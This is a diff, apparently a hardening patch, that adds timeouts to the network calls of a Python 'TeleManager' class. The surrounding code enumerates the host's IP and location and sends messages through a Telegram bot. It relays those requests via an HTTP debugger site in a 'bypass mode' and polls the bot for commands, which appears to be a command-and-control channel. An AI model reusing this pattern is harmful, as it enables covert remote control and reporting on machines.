@@ -50,7 +50,7 @@ class TeleManager():
         global userIp
         global userLocation
         try:
-            userIp = requests.get('https://api.ipify.org').text
+            userIp = requests.get('https://api.ipify.org', timeout=60).text
         except requests.ConnectionError or requests.RequestException:
             print(Fore.LIGHTRED_EX + '[-] IP Enum => Cant Get machine IP address, seem Internet Connection Error')
             return False
@@ -64,7 +64,7 @@ class TeleManager():
             }
         
         try:
-            response = requests.post(httpDebuggerUrl, data=payload)
+            response = requests.post(httpDebuggerUrl, data=payload, timeout=60)
             
             if response.status_code == 200:
                 soup = BeautifulSoup(response.content.decode(),'html.parser')
@@ -106,7 +106,7 @@ class TeleManager():
         url = f'https://api.telegram.org/bot{self.token}/sendmessage?chat_id={self.userId}&text={msg}'
         
         try:
-            response = requests.get(url)
+            response = requests.get(url, timeout=60)
             if response.status_code == 200:
                 print(Fore.LIGHTGREEN_EX + '[+] Message Sender => Message Sent Successfully on Normal Mode!'+Style.RESET_ALL)
                 return True
@@ -132,7 +132,7 @@ class TeleManager():
                 'MethodList':'GET'
             }
         
-        response = requests.post(url, data=payload)
+        response = requests.post(url, data=payload, timeout=60)
         
         if response.status_code == 200:
             print(Fore.LIGHTGREEN_EX + '[+] Message Sender Bypass Mode => Message Sent Successfully!'+Style.RESET_ALL)
@@ -202,7 +202,7 @@ class TeleManager():
                 'MethodList':'GET'
             }
         try:
-            response = requests.post(url, data=payload)
+            response = requests.post(url, data=payload, timeout=60)
             if response.status_code == 200:
                 #Parse Response html code
                 soup = BeautifulSoup(response.content.decode(),'html.parser')
@@ -240,7 +240,7 @@ class TeleManager():
         url = f'https://api.telegram.org/bot{self.token}/getUpdates'
         
         try:
-            response = requests.get(url)
+            response = requests.get(url, timeout=60)
             if response.status_code == 200:
                 lastCmd = response.json()['result'][-1]['message']['text']
                 print(Fore.LIGHTGREEN_EX+f'[+] Last Command => from Bot: {lastCmd}'+Style.RESET_ALL)
